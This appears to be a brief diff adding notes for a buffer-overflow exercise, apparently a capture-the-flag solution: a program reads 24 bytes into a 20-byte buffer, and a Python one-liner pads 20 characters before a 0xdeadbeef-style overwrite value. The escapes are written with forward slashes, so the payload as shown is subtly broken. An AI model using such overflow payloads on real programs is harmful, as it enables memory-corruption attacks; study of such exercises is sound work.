@@ -1,0 +1,5 @@
+buffer overflow
+
+reads 24 bytes into a buffer of 20
+
+python -c 'print "a"*20 + "/xef/xbe/xad/xde"'
